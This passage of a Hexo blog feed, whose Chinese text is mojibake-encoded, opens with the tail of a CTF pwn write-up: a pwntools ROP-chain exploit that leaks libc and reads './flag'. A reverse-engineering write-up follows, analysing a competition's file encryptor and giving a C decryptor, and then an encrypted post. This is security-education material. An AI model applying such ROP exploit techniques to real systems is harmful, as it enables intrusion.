class="number">4</span> + p64(RBP) + p64(RET) + p64(RBP + <span class="number">0xf0</span>) + p64(read))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x30</span>) + p64(RBP + <span class="number">0x65</span>) + p64(<span class="number">0x6edca</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x40</span>) + p64(read2) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>) + p64(RBP + <span class="number">0x150</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(pop_rbp))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(p64(leave) + p64(add_rbp_3d_ebx) + p64(pop_rbp) + p64(RBP + <span class="number">0xa8</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave) + p64(RBP + <span class="number">0xd0</span>) + p64(read) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(RBP + <span class="number">0x68</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">33</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x28</span>) + p64(ret) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(pop_rbp))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(p64(pop_rbp) + p64(RBP + <span class="number">0xd8</span> + <span class="number">1</span>) + p64(read) + p64(RBP + <span class="number">0x20</span>) + p64(leave) + p64(<span class="number">2</span>) + p64(RBP + <span class="number">0x28</span>) + p64(RBP + <span class="number">0xe8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(RBP + <span class="number">0x28</span>) + p64(ret) + p64(<span class="number">0</span>) + p64(<span class="number">0x33</span>) + p64(read3))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">7</span> + p64(pop_rbp))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">syscall = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libcbase = syscall - <span class="number">0x98fb6</span></span><br><span class="line">success(<span class="string">&#x27;libcbase&#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">rax = libcbase + <span class="number">0xdd237</span></span><br><span class="line">rdi = libcbase + <span class="number">0x10f75b</span></span><br><span class="line">rsi = libcbase + <span class="number">0x110a4d</span></span><br><span class="line">rbx = libcbase + <span class="number">0x586e4</span></span><br><span class="line">mov_rdx_rbx_pop_rbx_pop_r12_pop_rbp = libcbase + <span class="number">0xb0133</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0xc0</span> + <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(rax) + p64(<span class="number">3</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(syscall) + p64(rax) + p64(<span class="number">2</span>) + p64(rdi) + p64(RBP + <span class="number">0xe8</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(syscall) + p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(RBP) + p64(syscall) + p64(rax) + p64(<span class="number">1</span>) + p64(rdi) + p64(<span class="number">2</span>) + p64(syscall))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p><img src="/2025/08/30/ret2all/Pasted image 20250830183342.png" alt="Pasted image 20250830183342" style="zoom:50%;"></p></blockquote><p>å°½ç®¡æ— æ³•ç†è§£ PWN King çš„å…¨éƒ¨æ•™è¯²<br>ä½†å¤ªé˜³å‡èµ·æ—¶ï¼Œæˆ‘ä¼šå°†å…¶å…¨æ•°åŒ–ä¸ºå·±ç”¨<br>è¿™æ­£æ˜¯æˆ‘æ‰€æ“…é•¿çš„</p><p>å†™å®Œç›´æ¥é»‘åŒ–äº†</p><p><img src="/2025/08/30/ret2all/b8da6b642e5d7b3ddac97603a3775e6dc50c8077.jpg" alt="b8da6b642e5d7b3ddac97603a3775e6dc50c8077"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±Ÿè‹çœæ•°æ®å®‰å…¨æŠ€æœ¯åº”ç”¨èŒä¸šæŠ€èƒ½ç«èµ›å†³èµ›_é€†å‘WP</title>
      <link href="/2025/08/28/JSDSC-final-RE/"/>
      <url>/2025/08/28/JSDSC-final-RE/</url>
      
        <content type="html"><![CDATA[<h2 id="å…³äºæ¯”èµ›"><a href="#å…³äºæ¯”èµ›" class="headerlink" title="å…³äºæ¯”èµ›"></a>å…³äºæ¯”èµ›</h2><p><strong>å­¦ç”Ÿç»„ç¬¬2åï¼Œ498åˆ†</strong>ï¼Œç¦»ç¬¬1å°±å·®äº†4åˆ†ï¼Œç•¥æœ‰é—æ†¾ã€‚ä¸çŸ¥é“å¥–é‡‘æ˜¯ä¸æ˜¯æ¯ä¸ªç»„éƒ½æœ‰ï¼Œå¦‚æœæ¯ä¸ªç»„éƒ½æœ‰çš„è¯è¿˜èƒ½å–œæ2kå¥–é‡‘ï¼Œä¿åº•æœ‰ä¸ªå¥–æ¯ğŸ†è¿˜æ˜¯ä¸é”™çš„ã€‚</p><p>å¬å­¦é•¿è¯´æ˜¯<code>misc</code>,<code>crypto</code>,<code>re</code>æ··åˆèµ›æ‰å‚åŠ çš„ï¼Œç»“æœä»Šå¹´åŸºæœ¬çº¯ misc + 1é“ web æ¸—é€ + 1é“reï¼Œæœ‰ä¸€åŠçš„å®æ“é¢˜è¦æ¸—é€æ‰“è¿›å»äº†æ‰èƒ½æ‹¿åˆ°é™„ä»¶ï¼Œä½†ä¼—æ‰€å‘¨çŸ¥æˆ‘é™¤äº† web ä»€ä¹ˆéƒ½ä¼šåšä¸€ç‚¹ï¼Œæ‰€ä»¥æœ‰ä¸€åŠçš„å®æ“é¢˜éƒ½æ²¡æ‹¿åˆ°é™„ä»¶ï¼Œæ‰€å¹¸èµ›åæœ‰å¥½å¿ƒé€‰æ‰‹åˆ†äº«ï¼Œæˆ‘ä¹Ÿæ‹¿åˆ°äº†æ­¤æ¬¡æ¯”èµ›å”¯ä¸€ä¸€é“é€†å‘é¢˜çš„é™„ä»¶ã€‚</p><p>å…¶ä»–é¢˜ç®€å•æè¿°ä¸€ä¸‹ï¼Œé¦–å…ˆmiscå¤§éƒ¨åˆ†æ˜¯å†™çˆ¬è™«ï¼Œæˆ–è€…ç”¨å…¶ä»–æ‰‹æ®µçˆ¬å–æ•°æ®ï¼Œå°½é‡å­¦ä¼špythonå†™çˆ¬è™«ï¼›å‰©ä½™çš„åˆ™æ˜¯å¸¸è§çš„misc/æ•°æ®å¤„ç†ï¼›webå…¶å®å°±æ˜¯ä¸€é“å¼±å£ä»¤ï¼Œå¯†ç æ˜¯é¡¹ç›®çš„åå­—ï¼Œæˆ‘æŠŠæˆ‘æ‰€çŸ¥çš„æ¸—é€æ–¹æ³•éƒ½å°è¯•äº†ä¹Ÿæ²¡æƒ³åˆ°æ˜¯å¼±å£ä»¤å•Šï¼Œé—æ†¾ç¦»åœºğŸ˜­ï¼›æ¨¡å‹å®‰å…¨éœ€è¦è‡ªå·±åæ¨ä¸€ä¸ªsigmoidçš„å…¬å¼ï¼Œæ¨å‡ºæ¥å°±å¾ˆç®€å•äº†ï¼Œæˆ‘åº”è¯¥å°±æ˜¯é çš„è¿™é“é¢˜æ‰çˆ¬åˆ°ç¬¬2çš„ã€‚</p><p>å°±ç®€å•å†™ä¸€ä¸‹é€†å‘çš„wpäº†</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><blockquote><p>æ ¡å›­ç½‘ç®¡ç†ç³»ç»Ÿçš„ä¸‹è½½ç®¡ç†æ¨¡å—ä¸­ï¼Œpassword.zipä¸­çš„csvæ–‡ä»¶è¢«å¯ç–‘ç¨‹åºåŠ å¯†ï¼ˆåŠ å¯†çš„æ—¶é—´æ˜¯2025å¹´8æœˆ18<br>æ—¥ä¸Šåˆ8-12ç‚¹ï¼‰ï¼Œå¯¼è‡´éƒ¨åˆ†æ•°æ®æ— æ³•æ­£å¸¸è®¿é—®ã€‚è¯·ä¸‹è½½encrypy.zipï¼Œåˆ†æè¯¥åŠ å¯†ç¨‹åºï¼Œæ¢å¤è¢«åŠ å¯†çš„æ•°æ®ã€‚<br>åœ¨æ¢å¤å‡ºçš„æ•°æ®ä¸­å®šä½ç”¨æˆ·åä¸ºâ€œuser2030â€çš„è´¦æˆ·è®°å½•ï¼Œæäº¤å…¶passwordå­—æ®µçš„å€¼ä½œä¸ºç­”æ¡ˆã€‚</p><p>csvè¡¨å¤´ä¸º:id,username,password,hash</p></blockquote><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>idaç›´æ¥æ‰“å¼€ç¨‹åºå‘ç°åº”è¯¥æ˜¯åŠ å£³äº†<img src="/2025/08/28/JSDSC-final-RE/image-20250828150304025.png" alt="image-20250828150304025" style="zoom:50%;"></p><p>æŸ¥å£³</p><p><img src="/2025/08/28/JSDSC-final-RE/image-20250828150346750.png" alt="image-20250828150346750" style="zoom:50%;"></p><p>æ²¡æœ‰é­”æ”¹çš„upxå£³ï¼Œç›´æ¥è„±å£³</p><p>è„±å®Œå£³çœ‹mainå‡½æ•°ï¼Œç¨‹åºæ¯”è¾ƒç®€å•ï¼Œæ ¹æ®æˆ‘çš„ç†è§£ä¸ºå…¶<strong>ä¿®æ”¹äº†å˜é‡åå¹¶æ·»åŠ äº†æ³¨é‡Š</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*å…³é”®ä»£ç å¦‚ä¸‹ï¼š*/</span></span><br><span class="line">srand(key ^ <span class="number">0x9E3779B9</span>);                    <span class="comment">// è®¾ç§å­</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *step1_ptr++ ^= rand();                   <span class="comment">// æ¯ä¸ªå­—èŠ‚ä¸rand()ç»“æœå¼‚æˆ–</span></span><br><span class="line">    <span class="keyword">while</span> ( step1_ptr != end_ptr );</span><br><span class="line">    srand(key ^ <span class="number">0x85EBCA77</span>);                    <span class="comment">// å†è®¾seed</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ls_bit = rand() &amp; <span class="number">7</span>;                      <span class="comment">// å–ä½3bit</span></span><br><span class="line">      <span class="keyword">if</span> ( ls_bit )</span><br><span class="line">        *step2_ptr = __ROL1__(*step2_ptr, ls_bit);<span class="comment">// å·¦ç§»bitä½</span></span><br><span class="line">      ++step2_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( step2_ptr != end_ptr );</span><br><span class="line">    <span class="keyword">if</span> ( file_length != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      key_1 = key;</span><br><span class="line">      table_idx = <span class="number">0</span>;</span><br><span class="line">      srand(key_1 ^ <span class="number">0xC2B2AE3D</span>);                <span class="comment">// å†è®¾seed</span></span><br><span class="line">      step3_table = <span class="built_in">malloc</span>(<span class="number">8</span> * file_length);    <span class="comment">// ç½®æ¢è¡¨ (64bit * n)</span></span><br><span class="line">      table = step3_table;</span><br><span class="line">      <span class="keyword">if</span> ( !step3_table )</span><br><span class="line">        sub_1260(<span class="string">&quot;perm alloc&quot;</span>);</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        step3_table[table_idx] = table_idx;     <span class="comment">//  åˆå§‹åŒ–ç½®æ¢è¡¨ [0,1,2,...,n-1]</span></span><br><span class="line">        length = table_idx++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( file_length != table_idx );</span><br><span class="line">      step3_idx = length;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        idx = rand();</span><br><span class="line">        v22 = table[step3_idx];</span><br><span class="line">        v23 = &amp;table[idx % (step3_idx + <span class="number">1</span>)];</span><br><span class="line">        table[step3_idx] = *v23;</span><br><span class="line">        *v23 = v22;</span><br><span class="line">        --step3_idx;                            <span class="comment">// ç½®æ¢è¡¨ç”Ÿæˆ</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( step3_idx );</span><br><span class="line">      ptr_4 = <span class="built_in">malloc</span>(table_idx);</span><br><span class="line">      <span class="keyword">if</span> ( !ptr_4 )</span><br><span class="line">        sub_1260(<span class="string">&quot;perm buf alloc&quot;</span>);</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        ptr_4[step3_idx] = file_content[table[step3_idx]];<span class="comment">// æ ¹æ®ç½®æ¢è¡¨æ‰“ä¹±å­—èŠ‚</span></span><br><span class="line">        v25 = step3_idx++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( length != v25 );</span><br><span class="line">      __memcpy_chk(file_content, ptr_4, table_idx, ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr_4);</span><br><span class="line">      <span class="built_in">free</span>(table);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºæ˜¯ä¸€ä¸ª <strong>åŠ å¯†å™¨</strong>ï¼Œå®ƒçš„åŠ å¯†æ­¥éª¤æ˜¯ï¼š</p><ol><li><strong>éšæœºå¼‚æˆ–</strong>ï¼š<code>byte ^= rand()</code> ï¼ˆç§å­ = <code>time ^ 0x9E3779B9</code>ï¼‰</li><li><strong>éšæœºå¾ªç¯å·¦ç§»</strong>ï¼š<code>byte = ROL(byte, rand() &amp; 7)</code> ï¼ˆç§å­ = <code>time ^ 0x85EBCA77</code>ï¼‰</li><li><strong>éšæœºç½®æ¢</strong>ï¼šæŒ‰ç½®æ¢è¡¨æ‰“ä¹±å­—èŠ‚é¡ºåº ï¼ˆç§å­ = <code>time ^ 0xC2B2AE3D</code>ï¼‰</li></ol><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><ol><li><strong>æ¢å¤ç½®æ¢</strong><ul><li>ç”Ÿæˆç›¸åŒçš„ç½®æ¢è¡¨ï¼ˆç”¨ç›¸åŒç§å­ <code>time ^ 0xC2B2AE3D</code>ï¼‰ã€‚</li><li>ç½®æ¢æ˜¯å¯é€†çš„ï¼Œç”¨è¡¨æ¢å¤åŸé¡ºåºã€‚</li></ul></li><li><strong>é€†å‘å¾ªç¯å·¦ç§»</strong><ul><li>é‡æ–°ç”Ÿæˆç›¸åŒçš„éšæœºæ•°åºåˆ—ï¼ˆç”¨ç§å­ <code>time ^ 0x85EBCA77</code>ï¼‰ã€‚</li><li>é€å­—èŠ‚æ‰§è¡Œ <strong>å¾ªç¯å³ç§»</strong>ï¼ˆä¸åŠ å¯†æ—¶å·¦ç§»ç›¸åï¼‰ã€‚</li></ul></li><li><strong>é€†å‘å¼‚æˆ–</strong><ul><li>é‡æ–°ç”Ÿæˆç›¸åŒçš„éšæœºæ•°åºåˆ—ï¼ˆç”¨ç§å­ <code>time ^ 0x9E3779B9</code>ï¼‰ã€‚</li><li>å†æ¬¡æ‰§è¡Œ <code>byte ^= rand()</code>ï¼ˆå¼‚æˆ–æ˜¯è‡ªé€†è¿ç®—ï¼‰ã€‚</li></ul></li></ol><h2 id="è§£é¢˜è„šæœ¬"><a href="#è§£é¢˜è„šæœ¬" class="headerlink" title="è§£é¢˜è„šæœ¬"></a>è§£é¢˜è„šæœ¬</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> <span class="title function_">ROR1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> val, <span class="type">int</span> shift)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (val &gt;&gt; shift) | (val &lt;&lt; (<span class="number">8</span> - shift));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">decrypt_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *in_filename, <span class="type">const</span> <span class="type">char</span> *out_filename, <span class="type">int</span> timestamp)</span> &#123;</span><br><span class="line">    FILE *in = fopen(in_filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open input&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(in, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">long</span> n = ftell(in);</span><br><span class="line">    rewind(in);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        fclose(in);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Empty file\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf = <span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        fclose(in);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(buf, <span class="number">1</span>, n, in) != (<span class="type">size_t</span>)n) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fread&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(buf);</span><br><span class="line">        fclose(in);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(in);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        srand(timestamp ^ <span class="number">0xC2B2AE3D</span>);</span><br><span class="line">        <span class="type">size_t</span> *perm = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * n);</span><br><span class="line">        <span class="keyword">if</span> (!perm) &#123;</span><br><span class="line">            perror(<span class="string">&quot;perm alloc&quot;</span>);</span><br><span class="line">            <span class="built_in">free</span>(buf);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (<span class="type">size_t</span>)n; i++) &#123;</span><br><span class="line">            perm[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="type">size_t</span> j = rand() % (i + <span class="number">1</span>);</span><br><span class="line">            <span class="type">size_t</span> tmp = perm[i];</span><br><span class="line">            perm[i] = perm[j];</span><br><span class="line">            perm[j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *tmpbuf = <span class="built_in">malloc</span>(n);</span><br><span class="line">        <span class="keyword">if</span> (!tmpbuf) &#123;</span><br><span class="line">            perror(<span class="string">&quot;perm buf alloc&quot;</span>);</span><br><span class="line">            <span class="built_in">free</span>(buf);</span><br><span class="line">            <span class="built_in">free</span>(perm);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (<span class="type">size_t</span>)n; i++) &#123;</span><br><span class="line">            tmpbuf[perm[i]] = buf[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, tmpbuf, n);</span><br><span class="line">        <span class="built_in">free</span>(tmpbuf);</span><br><span class="line">        <span class="built_in">free</span>(perm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srand(timestamp ^ <span class="number">0x85EBCA77</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> shift = rand() &amp; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">if</span> (shift) &#123;</span><br><span class="line">            buf[i] = ROR1(buf[i], shift);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srand(timestamp ^ <span class="number">0x9E3779B9</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        buf[i] ^= rand();</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *out = fopen(out_filename, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!out) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open output&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fwrite(buf, <span class="number">1</span>, n, out) != (<span class="type">size_t</span>)n) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fwrite&quot;</span>);</span><br><span class="line">        fclose(out);</span><br><span class="line">        <span class="built_in">free</span>(buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(out);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted: %s -&gt; %s\n&quot;</span>, in_filename, out_filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;input&gt; &lt;output&gt; &lt;timestamp&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *in_file = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *out_file = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> timestamp = atoi(argv[<span class="number">3</span>]); <span class="comment">// åŠ å¯†æ—¶çš„ time(0)</span></span><br><span class="line">    <span class="keyword">return</span> decrypt_file(in_file, out_file, timestamp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æƒ³è¦æ­£ç¡®è§£å¯†éœ€è¦çˆ†ç ´æ—¶é—´æˆ³ï¼Œæ ¹æ®åŠ å¯†æ—¶é—´ç¡®å®šçˆ†ç ´èŒƒå›´<img src="/2025/08/28/JSDSC-final-RE/image-20250828152521491.png" alt="image-20250828152521491" style="zoom:50%;"></p><p><img src="/2025/08/28/JSDSC-final-RE/image-20250828152635392.png" alt="image-20250828152635392" style="zoom:50%;"></p>]]></content>
      
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šè®¡ç®—æœºç½‘ç»œã€‹æœŸæœ«å¤§é¢˜&amp;åè¯è§£é‡Š&amp;ç›¸å…³ä¹ é¢˜ï¼ˆè‡ªç”¨ï¼‰</title>
      <link href="/2025/06/17/Key_Points_for_Computer_Network_Exam/"/>
      <url>/2025/06/17/Key_Points_for_Computer_Network_Exam/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰ï¼Œå¯†ç é”™è¯¯ï¼Œè¯·å†è¯•è¯•" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cf88e1507156b17d448f82d416c3a7a27a74ad0cd9e92d6e5455a8f6edb8e77d">eb502a03f021f977c9a27fe278c6ef1af7e30ffbaaea9c9ab648f51599a0b78c02d0fdca31fc1974c8b7f20a0e0fb934fa7635f6864a626f98c4a1867799a394265b0ec3c0a6c0b2dc2d537de83a18bd734bd53a831c831e83dfa3436095a49eef76be8c1084365f2bbcd33d7d5dda4f334e0d31b38af7ecb1c16941c06c29e13b7a405dc9ef235607ef994e2739b87afadc7f50e2e0d6940f85c6b18e2b527e4d74a21f20289c4f779f58dceb58a93430ed01904451f77ed20b460b469a418890617e00c93333b690a4dfb50cdba44c8c71b26679da1c731b95d59e13838c4698d4d337cedd862dfadee078bc088da5887966b8d0f7eb5f090682f01b7ab9b6641a05ad96602f3bd621ba06fe71bae21c9a85d79a6cce8a2563ef1486112c37c1625a2b20de2813c169184cfa67cf6b22eef78a07cfca6fd92cec439486bcd02f119b88949697d377eb1ba50ffc5983c16086f979cce6e19ec77d06087aa148f06af1e571b2cd543fc37a91cd9b6b157aa9e0897c8cde301262006549c4fe8dc03d4d199f255692c86bd4d4af9a2431edeecbee5b48649f9cc44c02f3290c330556406a662845e8b27a3d52cfd4392aae0fe4de6d6f6804c270401cbfc0a426ad0c5168a2cea296da8662443aa8ec1bfbf78f37221038cc8b1d5b383c6feb889a826a12d785160b22aa1562ddd4f73a6589ad7f3c8cdfeab9cf9f7e66f184dcf6ce9bffe7e884bc6027d4779e92bc70fa46a78d3aac7bc682f7c9bddb4cfd58c8eb4dae52ea53f684a7dafcd1883327036381266151b9749401ccae3c637a7d2af38ae8367f208e10dcb070ebd39bcb80a33523605889be0ff824a693718108ee8b6f33a6e173b0d27a88642d2fd2cf8aed855690ee382837d670758890d4e3e92fd3fb94ee2096a037edc9ff5b2656a9c5169f32a3c79391233f7fade4ed767e98186af8c707a39b7c3a784dff51f4c119fae15d7382895e1e7a0d8ab3dc81a2f92d4f8ec2e5b24e49540819a86319920470bd245f30ec43c75a11017716999f0b79c45613106f9f3eefefb19910bbbeccf3e5aef736342e302e68fbfb96f04b9e7ae6918bd60f45185de99216026a90449944df48e67490effdda87897d106df1fda05db5a9874deaf6d93b71d337f43ee0a77d04f8715040fd06cd806634c3b3f00c8ecdede285a420573bbcdf1990e52675b10aebf31839819a6b1798b4926bb940f3c9fb9ca16245fbf3f7598222f6845fc4a615bdaf23dfdd8bec4dcac4e29ebfe10c89c5631097f54825c2e81f4796ae583f7162db98470a3301be6c08e0d6f88ea674cf959bdb8609a57c0d2286a92f86a4e9d23cf4982464987c4a4688d61d0045c3f60168106386cb60b82c4f3b7d1d5a84484fa687a9e11db6ee9248b6a41afdf2d33a33ed4c50f7d06b5aac0c3447bad997d665563b1298ef2655fd3e166c6e42988bd5a28d66bdf1db765b525fce18deb3159534f7d1c90915c5d0ac28b339b49c7f15529a8aa5cc1de5ed371aa6f7957e6cc3dd222dbe26f40e2956dc82b3c58c64a5f83dbbf62fbef6aca074cc7d3f293e5d10462ff017cce3bad9de15baa0abafd0d6fd2a8d2ceecf48e551fc8d53450a440d851cffad8bccdc590ffdfc1b13e35edcfed71bb6931aedff28ca9f856d5bea2a671f4b9f7b72b735a524a555df151611f5bebc910871db4974ae9b837bdbb09cf70053a55b2f39d219b3ac9192bcbb307b42d2b78b299ce739c5bbb986882421793f1713219e0546291e57b9b83e8b97b026c587fca80a432ba9a5326d58b595a116db0794038df647628019ca67f10dbe715a2617b69dfa81115d3681565d89684432a41317e50800cb487913b3dee52dd6fb42675aa0b981d3e37315b01b5cf6f806610f56a01a25d74588ab24baac659cde6bc838be4e52df0d823b94ce653012d8edf5369430b51a26c2b1b6dacde9ccdb096a73a10598bbea9f8f9d01904ed2371990c772740a7c